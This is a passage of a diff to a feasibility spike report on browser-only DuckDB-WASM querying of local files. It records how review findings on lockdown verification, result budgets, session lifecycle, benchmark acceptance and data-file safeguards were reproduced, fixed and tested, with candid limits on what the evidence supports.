+| E2: every escalation statement errors | **Partly met**: 19/21 error; 2 `INSTALL` statements return without effect (§9.4) |
+| E2: CSV/Parquet without a runtime third-party fetch | **Met** (self-hosted, hash-checked at build time) |
+| E4: work stops within 2 s; follow-up query succeeds | **Met in Chrome** (≤ 264 ms, all cooperative) |
+| E4: memory after 20 cycles ≤ 110 % of cycle 1 | **Met** (Chrome, 50 MB CSV) |
+| E4: UI acknowledges Cancel ≤ 200 ms | **Not measured separately** |
+| E6: 50 MB passes with no crash in all three browsers | **Met in Chrome only** |
+| E8: no main-thread long task > 200 ms while streaming bounded results | **Met in Chrome** (0 long tasks > 50 ms) *[Corrected: §10.2/§10.6 — headless only; the byte budget was checked after conversion (Codex finding 2); rendering not tested]* |
+
+### 9.11 Conclusions and recommendations
+
+1. **Browser-only SQL over local files is technically feasible on the reference machine in Chrome.** CSV, Parquet and NDJSON files up to 1 GB (CSV size) were queried correctly, with the UI staying responsive and cancellation working. This is evidence for the tested workloads, browser and machine state only. It is **not a support claim.** *[Corrected: §10.6 — these are headless, warm-cache observations of bounded probes with a small dimension-side join; they do not establish a 1 GB capability or visible-window responsiveness. The proposed initial qualification target is 50 MB combined, desktop Chrome, file-backed CSV/Parquet.]*
+2. **Privacy needs explicit engineering. "Runs in the browser" is not enough.** DuckDB-WASM's defaults fetch extensions from a third party, and a meta CSP does not stop the worker. The lockdown in this spike works in Chrome and should become a hard requirement of P-003/P-013, with its probe tests kept as a regression suite.
+3. **Prefer file-backed views as the default.** Registration is near-instant, the data is read from the `File` on demand and survives a worker restart cheaply, and peak RSS was equal or lower than with imported tables. Importing into a table made repeated queries about 3× (full sort) to 40× (top-N) faster, mostly 11–25×. But it cost 0.4–9.1 s up front, is lost on restart, and peak RSS was equal (50 MB) or higher (200 MB–1 GB). Offer it as an explicit choice.
+4. **Parquet is the strongest format.** CSV file-view queries at 1 GB took 3.5–5.3 s each (11.8 s for a full sort) because the file is re-parsed every time.
+5. **Before P-003 can be confirmed:** run Safari and Firefox; do a real GitHub Pages deployment (MIME, compression, caching); collect DuckDB's third-party notices; decide how to handle the `INSTALL` no-op; and characterise the memory ceiling on a machine where a crash is acceptable.
+
+## 10. Codex review resolution (Step 3.6, 2026-11-25)
+
+Codex reviewed the spike and returned **CONDITIONAL GO**, with four high-severity and three medium-severity findings. All seven were reproduced on the unmodified build before any change, then corrected and covered by regression tests. Everything here is spike evidence in **desktop Chrome 158 only**. None of it is a confirmed production decision.
+
+### 10.1 Finding 1: fail-open startup and a production lockdown bypass (HIGH) — RESOLVED
+
+- **Reproduced:**
+  - With `SET lock_configuration = true` made to fail (by wrapping the connection's `query` at runtime), `start()` still resolved and reported `lockdown: true`.
+  - `lock_configuration` read `false`, and `SET autoload_known_extensions = true` succeeded.
+  - The production bundle contained the `?lockdown=off` switch.
+- **Root cause:** lockdown errors were collected into an array and startup continued. The effective state was never verified. The negative-control switch lived in the production entry point.
+- **Correction:**
+  - `bootEngine()` treats any failed lockdown statement as fatal.
+  - It then verifies the **effective** state independently of the statements that ran (`verifyLockdown`):
+    - ten settings read from `duckdb_settings()`, including `allow_unsigned_extensions` and `allowed_paths`;
+    - the exact set of loaded extensions;
+    - an active check that the lock rejects a configuration change.
+  - On any failure the candidate worker is terminated and `start()` rejects (`LockdownError`, state `failed`). Until a verified engine exists, no SQL runs and no file is accepted. The UI keeps the file input and the Run button disabled.
+  - Recovery uses the same path.
+  - The bypass is removed from the app. The unlocked negative-control engine and fault injection exist only in a separate test build (`harness/`, `vite.harness.config.ts` → `dist-harness/`).
+- **Evidence (automated):**
+  - Seven injected faults (failed lock, omitted lock, omitted external-access switch, omitted autoload switch, omitted `allowed_directories`, missing `json` extension, failed repository setting) each make `start()` reject with state `failed`. SQL and registration are refused, and the worker count returns to baseline.
+  - Recovery re-verifies the lockdown. A fault injected only into the recovery boot leaves the session `failed`, not usable.
+  - The production `dist/` contains none of the harness markers. The same scan finds them in `dist-harness/`, which shows the scan works.
+  - `?lockdown=off` on the production build has no effect.
+- **Remaining:** the fault-injection *option* (`lockdownPlan`) exists in the production class. It can only make startup fail, because verification doesn't depend on it, and the production app never sets it.
+
+### 10.2 Finding 2: result byte budget checked after conversion (HIGH) — PARTLY RESOLVED
+
+- **Reproduced:** a one-row `repeat('x', 2 MiB)` under a 1 KiB budget returned the full 2,097,152-character string, converted on the main thread.
+- **Root cause:** cells were converted with `vector.get()` (which decodes the whole value), and the byte budget was checked afterwards.
+- **Correction (`bounded.ts`, `format.ts`):** separate budgets for rows, columns (200), characters per cell (500), total display characters (2,000,000) and Arrow bytes accepted (16 MiB), all applied before conversion:
+  - Strings and binaries are measured from Arrow offsets, and only a bounded prefix is decoded.
+  - Lists and maps are measured from offsets, and only their first items are formatted.
+  - Structs are formatted field by field within the cell budget.
+  - Each kind of truncation is reported separately: `rows`, `arrowBytes`, `displayChars`, `columns`, and the number of shortened cells.
+- **Evidence:** 11 unit tests and 7 browser tests on real DuckDB results:
+  - the 2 MiB repro;
+  - eight cells of 300 KB;
+  - 400-column rows;
+  - display-budget truncation without row truncation;
+  - a 200,000-item list, a struct holding a 1 MB string, a 5,000-entry map, and a list of large strings.
+- **What the application cannot bound (engine-level limitation):** DuckDB-WASM produces result batches of up to **2,048 rows** (observed), and no setting bounds a batch's size in bytes. Each batch is built in the worker and posted to the page whole before any application check runs. One batch with huge cells is therefore fully allocated in the worker, during the transfer, and as an Arrow buffer on the page. The application stops requesting further batches and avoids decoding them, but **no hard memory guarantee is claimed.** Engine working memory is governed by DuckDB's `memory_limit`.
+
+### 10.3 Finding 3: incomplete session lifecycle (HIGH) — RESOLVED for the prototype
+
+- **Reproduced:**
+  - During a table import, `busy` was `false` and `cancel()` returned `none`.
+  - A session disposed during `start()` could still run `SELECT 1`.
+  - From the source: a rejected `cancelSent()` skipped the termination fallback, and a failed relation creation was never rolled back.
+- **Root cause:** there was no single owner of the session state. Imports used the blocking `query()` and were not tracked. `dispose()` couldn't reach a pending startup.
+- **Correction (`session.ts`):** an explicit state machine (`idle → starting → ready ⇄ busy → cancelling → recovering → ready | failed`, plus a terminal `disposed`) and one FIFO operation queue.
+  - Imports run through the streaming API and can be cancelled.
+  - A rejected, timed-out or ineffective cancel terminates the worker and recovers, within `cancelDeadlineMs` plus the recovery time.
+  - Every startup step races a disposal signal, so `dispose()` wins.
+  - **Found during this fix:** without that race, a worker terminated mid-`instantiate()` never answers, so `start()` hung forever. The first version of the regression test caught it, with all four disposal timings timing out.
+  - Failed registrations roll back the registered file and metadata.
+  - Recovery re-attaches file-backed views and marks imported tables `needs-reimport`, with an explicit `reimport()`.
+- **Evidence (automated):**
+  - Disposal at 0, 20, 100 and 300 ms into startup: start rejects, nothing is usable, and the worker count returns to baseline.
+  - Disposal during a query with another queued: both are rejected and the worker is terminated.
+  - A 3 M-row CSV import is `busy` and cancellable: cooperative, 155 ms, and the cancelled import leaves no table and no dataset entry.
+  - A rejected `cancelSent()` leads to termination and recovery to a working engine (generation 2).
+  - A `cancelSent()` that never answers times out after 400 ms, then termination and recovery.
+  - A cooperative cancel keeps generation 1.
+  - Recovery restores views; a table is marked `needs-reimport` and is not queryable until re-imported, after which it is.
+  - A corrupt Parquet file, in view and table mode, leaves no registered file and no relation.
+  - 8 concurrent queries each return their own result.
+- **Remaining:** short non-streamed phases (`registerFileHandle`, `CREATE VIEW`) can't be cancelled cooperatively. `cancel()` waits up to the deadline, then terminates. Re-attach cost at scale on the restart path was not measured.
+
+### 10.4 Finding 4: concurrent registration collisions (HIGH) — RESOLVED
+
+- **Reproduced:** two concurrent `same.csv` registrations (values 11 and 22) were both named `same`. Querying the first returned 22. Removing the first dropped the relation while the second stayed listed, and then failed with "Table with name same does not exist".
+- **Root cause:** each name was chosen before an asynchronous step, without serialization, and `CREATE OR REPLACE` let the second registration silently replace the first.
+- **Correction:**
+  - Registration runs inside the serialized queue.
+  - The relation name is reserved against registered datasets **and** the engine catalog, so a user-created table is never replaced.
+  - `CREATE` replaces `CREATE OR REPLACE`.
+  - Removal works by dataset ID and drops only that dataset's own relation.
+- **Evidence (automated):**
+  - The repro gives `same` = 11 and `same_2` = 22. Each can be removed independently; the other stays queryable until it is removed.
+  - The same result holds through the real file input.
+  - A user table `mine` survives registering `mine.csv`, which becomes `mine_2`.
+  - Removing one dataset while two more `x.csv` files register gives a consistent catalog and listing.
+
+### 10.5 Finding 5: benchmark completion mistaken for success (MEDIUM) — RESOLVED for new runs; historical runs reclassified
+
+- **Reproduced:**
+  - All 19 historical runs are labelled `completed`, and the CLI exited 0 on completion.
+  - The summariser could show "all answers correct" without checking that every planned workload ran.
+  - Inputs were not hashed, and no source revision was recorded.
+  - My earlier reports said the 703 workload records were all correctness checks. **That was wrong.**
+- **Correction:**
+  - Each record now carries a `verdict`: `pass`, `fail`, `cancel-exercised`, `cancel-not-exercised`, `cancel-recovery-failed`, `stress-completed`, `expected-boundary-error`, `unexpected-error` or `aborted-timeout`.
+  - Runs record the list of planned workloads.
+  - `scripts/lib/acceptance.mjs` separates **harness completion** from **acceptance**. A run is `accepted` only if:
+    - the harness completed;
+    - the inputs were validated;
+    - provenance was recorded;
+    - nothing is missing;
+    - there are no failed assertions, unexpected errors, timeouts or recovery failures;
+    - every cancel workload exercised a cancellation.
+  - Boundary errors are accepted only in runs declared with `--expect-boundary-errors`.
+  - The CLI SHA-256-checks the selected inputs against the manifest and records provenance: git HEAD, branch, dirty status, and hashes of the lock files, runner, generator and every `dist/` file. It **exits non-zero unless the run is accepted.**
+  - 8 unit tests cover the acceptance rules.
+- **Historical reconciliation.** These are the original records; the verdicts are derived, and the measurements are unchanged:
+
+| Category (19 historical runs) | Records |
+|---|---:|
+| Workload records | 703 |
+| Answer-check assertions (all passed) | 517 |
+| Cancellations exercised (follow-up query OK) | 160 |
+| Cancel workloads that finished before the cancel fired | 14 |
+| Stress workloads completed (no answer check) | 9 |
+| Expected boundary failures (OOM at memory_limit 256 MB) | 3 |
+| Unexpected errors / timeouts | 0 / 0 |
+| Records without a frame-gap sample | 84 |
+
+- All 19 historical runs are classified **`historical-unvalidated`**: no input hashes, no source revision, derived verdicts. Three of them (tiny CSV; 50 MB Parquet view; 50 MB CSV table) **never exercised one of their cancel workloads**, so even with full provenance they would have been rejected.
+
+### 10.6 Finding 6: conclusions beyond the measured coverage (MEDIUM) — RESOLVED in the documentation
+
+- **Valid.**
+  - 84 historical records have no frame-gap sample.
+  - All runs were headless.
+  - The workloads were bounded probes with a small dimension-side join. Large-to-large joins, wide tables and skew were not covered.
+  - The planned 10,000-row rendering test did not run.
+  - Recovery at scale was not measured.
+  - NDJSON peaked at 444.6 MB on disk (449.5 MB with its customers CSV), from the "200 MB" tier.
+- **Physical input per historical tier** (orders + customers files actually selected):
+
+| Tier label | CSV (view or table) | Parquet | NDJSON + customers CSV |
+|---|---:|---:|---:|
+| 50 MB | 51.2 MB | 21.7 MB | 113.3 MB |
+| 200 MB | 204.9 MB | 90.0 MB | 449.5 MB |
+| 500 MB | 512.7 MB | 232.4 MB | not run |
+| 1 GB | 1,025.5 MB | 467.8 MB | not run |
+
+- **Qualification boundary:**
+  - The historical 50 MB–1 GB measurements stay as recorded observations: headless, warm OS cache, Chrome only, bounded probes. **They do not establish general 1 GB support.**
+  - **Proposed initial qualification target, not an established limit:** desktop Chrome; file-backed CSV and Parquet up to **50 MB combined** physical input; a small dimension-side equi-join; bounded previews and aggregates.
+  - Before the target can be advertised, it must be qualified at its ceiling for skew, wide cells, cancellation, recovery and visible-window responsiveness.
+  - Imported tables, larger inputs, NDJSON, and every browser other than Chrome remain experimental.
+
+### 10.7 Finding 7: entry-point-dependent safeguards and Git protection (MEDIUM) — RESOLVED
+
+- **Reproduced:**
+  - The manual panel applied no size guard.
+  - The CLI checked the size *label*, not the files.
+  - `git check-ignore` showed that `data.csv`, `some/dir/export.csv`, `.npmrc`, `*.sqlite-wal`, `*.sqlite-shm` and `*.db-journal` could be staged.
+- **Correction:**
+  - **CLI:**
+    - resolves real paths and refuses inputs outside `data/`;
+    - uses actual file sizes: over 50 MB combined needs `--confirm-large`, over 250 MB also needs `--maintainer-approval "<who, when>"`;
+    - hashes the inputs;
+    - takes a PID lock file, so only one benchmark runs at a time.
+  - **Page entry point** (shared by the manual panel and the CLI):
+    - checks sizes against the manifest;
+    - checks SHA-256 for inputs up to 50 MB combined (the browser has to read the whole file to hash it);
+    - requires explicit confirmation above 50 MB and refuses above 1.1 GB;
+    - takes a Web Locks lock across tabs and a per-tab single-run guard.
+    - The browser cannot measure host memory pressure, so no host metric is shown.
+  - **`.gitignore`:**
+    - data files are ignored everywhere except under `fixtures/`;
+    - also ignored: `.npmrc`/`.yarnrc`/`.pypirc`, `*.local.*` config files, every SQLite/DuckDB sidecar (`-wal`, `-shm`, `-journal`), `dist-harness/` and the bench lock file.
+    - This reverses my earlier decision not to ignore `.npmrc`: none is needed, and one can be re-included deliberately after review.
+- **Evidence:**
+  - 4 browser tests: valid tiny inputs pass with hashes verified; a same-size tampered file is refused; an unconfirmed 51 MB input and an unlisted file are refused; a second concurrent run is refused.
+  - CLI refusals observed: a 512.7 MB input without approval, a 51.2 MB input without `--confirm-large`, and a lock held by a live PID.
+  - `git check-ignore` confirms the 14 risky paths are ignored and the 7 intended files (fixtures, lock files, `summary.json`, `.env.example`) stay committable.
+
+### 10.8 New regression benchmarks (schema v2, Chrome 158, headless, reference MacBook Air)
+
+Small and safe only. No 500 MB / 1 GB or memory-ceiling runs were repeated. The working tree was uncommitted (recorded as `workingTreeDirty: true`; git HEAD `eb877c2`).
+
+| Run | Physical input | Harness | Acceptance | Assertions | Cancels exercised / not | Frame-gap missing | Peak RSS (tree / renderer) |
+|---|---:|---|---|---:|---:|---:|---:|
+| tiny CSV view | 0.2 MB | completed | **rejected** (queries finish before cancel fires) | 12/12 | 0 / 4 | 2 | — |
+| 50 MB-tier Parquet view, cancel at 1,000/250 ms | 21.7 MB | completed | **rejected** (full sort finished before its cancel) | 36/36 | 5 / 5 | 13 | 1,018 / 573 MB |
+| 50 MB-tier Parquet view, cancel at 400/100 ms | 21.7 MB | completed | **accepted** | 36/36 | 10 / 0 | 13 | 1,128 / 641 MB |
+| 50 MB-tier CSV view (`--confirm-large`) | 51.2 MB | completed | **accepted** | 36/36 | 10 / 0 | 0 | 1,006 / 527 MB |
+
+- Both accepted runs had inputs SHA-256-verified, every cancel cooperative, and follow-up queries OK.
+- The CSV run is 1.2 MB **over** the proposed 50 MB combined ceiling. Only the Parquet run is inside it.
+
+### 10.9 Updated acceptance matrix (spike, Chrome only)
+
+| Criterion (§6) | Status | Evidence |
+|---|---|---|
+| E1: boots without isolation; only same-origin static requests | **Met (Chrome, local Pages-style server)** | `spike.spec.ts`, `security.spec.ts`. Real GitHub Pages not tested |
+| E2: lockdown verified fail-closed; zero external requests and canary leaks | **Met (Chrome)** | Every request is a same-origin GET with no query string and no body, no redirects, and no canary in headers. 0 listener hits. Positive controls prove page and worker traffic are observable |
+| E2: every escalation statement errors | **Partly met** | 19 of 21 error. 2 `INSTALL` statements return without effect (no request; loaded set unchanged) |
+| E2: extension integrity | **Build-time only** | SHA-256 lock at vendoring. Runtime signature checking by DuckDB not independently verified |
+| E4: work stops within 2 s; follow-up succeeds; import cancellable | **Met (Chrome)** | 185 exercised cancellations (160 historical, 25 in the new runs), all cooperative. Import cancel 155 ms. Rejected and timed-out cancels recover by termination |
+| E4: no leak over 20 cycles | **Met (historical, 50 MB CSV)** | Not repeated on the new build |
+| E4: UI acknowledges Cancel ≤ 200 ms | **Not measured separately** | — |
+| E6: 50 MB-tier passes in all three browsers | **Chrome only** | Accepted v2 runs: Parquet 21.7 MB, CSV 51.2 MB |
+| E8: bounded results; no long tasks | **Partly met** | Budgets enforced before conversion. Per-batch transfer is not bounded (engine). Headless only. Rendering not tested |
+| Benchmark integrity | **Met for new runs** | Acceptance separate from completion; input hashes; provenance; non-zero exit |
+
+### 10.10 Security and privacy assessment (spike)
+
+- **Established, in Chrome 158 on the production artifact:**
+  - the engine cannot start without a verified lockdown;
+  - SQL escalation paths are blocked;
+  - every observed request is a same-origin static GET with no data in the URL, body or headers;
+  - an unlocked engine *would* reach the network, and the capture method sees it.
+- **Not established:**
+  - Safari and Firefox behaviour;
+  - DuckDB functions outside the probe list;
+  - runtime extension signature verification;
+  - a real GitHub Pages origin (shared `*.github.io` storage, CDN caching, redirects);
+  - a compromised build (supply chain);
+  - denial of service through expensive SQL (mitigated by cancel and timeouts, not prevented).
+- **Defence in depth:** the meta CSP restricts the **page** (observed: a cross-origin fetch from the page is blocked) but **not** the engine worker, which a positive control confirmed. The engine lockdown remains the primary control.
+- **Not claimed:** complete network isolation beyond these tests.
+
+### 10.11 Outstanding feasibility concerns
+
+| Concern | Status |
+|---|---|
+| Safari | NOT TESTED. Needs Safari remote automation enabled (maintainer setting) or a manual run of the benchmark panel |
+| Firefox | NOT TESTED. Not installed. Installing it needs approval |
+| DuckDB-WASM `mvp` fallback bundle | NOT TESTED. Chrome always selects `eh`. The `mvp` build and extensions are shipped and hash-locked but never exercised |
+| Real GitHub Pages deployment | NOT DONE. Needs approval |
+| Runtime extension integrity | UNVERIFIED. Build-time SHA-256 lock only. `allow_unsigned_extensions = false` is verified as a setting, but its runtime effect on signed binaries was not tested |
+| Licence notices | PARTLY RESOLVED (§10.12) |
+| E3 diagnostic correctness corpus | NOT RUN |
+| E5 SQL parsing | NOT RUN beyond confirming `json_serialize_sql` works under lockdown |
+| Visible-window responsiveness | NOT MEASURED (headless only) |
+| Large-result rendering (10,000 rows) | NOT RUN |
+| Memory-ceiling recovery (WASM heap near 4 GB) | NOT RUN. Deliberately skipped for safety; needs approval and a machine where a crash is acceptable |
+
+### 10.12 Licences and the pinned engine version
+
+**Confirmed from authoritative upstream sources** (GitHub `duckdb/duckdb-wasm` and `duckdb/duckdb`, via the GitHub API, 2026-11-25):
+- DuckDB-WASM is MIT, "Copyright 2018-2025 Stichting DuckDB Foundation", per the repository's `LICENSE`. The installed npm package **does not include this file**, so the notice must be added to any redistribution.
+- DuckDB core is MIT, "Copyright 2018-2026 Stichting DuckDB Foundation".
+- DuckDB v1.5.4 bundles about 30 third-party components under `third_party/`. Their licence files show only permissive licences:
+  - MIT: fmt, fsst, fast_float, hyperloglog, jaro_winkler, miniz, pcg, skiplist, utf8proc, vergesort, yyjson, httplib, brotli;
+  - BSD-style: libpg_query, lz4, re2, snappy, snowball, zstd, jemalloc;
+  - Apache-2.0: fastpforlib, parquet, tdigest;
+  - Boost: concurrentqueue, ska_sort;
+  - mbedtls: dual Apache-2.0/GPL-2.0-or-later.
+- `apache-arrow` (Apache-2.0) ships a `NOTICE.txt` that Apache-2.0 §4(d) requires to accompany redistribution.
+- `react`, `react-dom`, `scheduler` are MIT; `qs` is BSD-3-Clause; `tslib` is 0BSD; `flatbuffers` and `@swc/helpers` are Apache-2.0. Each ships its licence file.
+
+**Confirmed redistribution requirements:**
+- include the MIT notices for DuckDB-WASM and DuckDB;
+- include the Apache-2.0 licence and the Arrow `NOTICE.txt`;
+- include the licence texts of the other bundled npm packages.
+
+**Unresolved:**
+- which `third_party` components are actually compiled into the WASM binaries and the `parquet`/`json` extensions;
+- whether those components carry NOTICE files;
+- `thrift` (no licence file at its directory top level) and `pdqsort` (licence text not identified);
+- mbedtls: if it is compiled in, the Apache-2.0 option should be documented;
+- which npm packages end up inside the minified bundle. Grepping for package names is unreliable; a build-time licence extraction step is needed.
+
+**Engine version risk:**
+- `1.33.1-dev57.0` is the npm `latest` dist-tag but is a development-numbered build (published 2026-06-22).
+- The newest non-dev npm version is `1.32.0` (2025-12-16).
+- GitHub release `v1.33.0` (2025-12-16) says it has "no real differences from 1.32.0", but **no `1.33.0` exists on npm**.
+- Moving to `1.32.0` would most likely change the DuckDB core version *(not verified; it would need installing)*. That would require:
+  - re-vendoring extensions for that core version;
+  - re-checking that every lockdown setting exists, notably `allowed_directories`, `allowed_paths` and `allow_unsigned_extensions`;
+  - re-validating the serialised-SQL JSON format (E5);
+  - re-running the whole test suite.
+- **Recommendation:** keep the current pin for the spike. Before production, evaluate `1.32.0` (or a later stable npm release) in a separately approved spike. **No version change was made.**
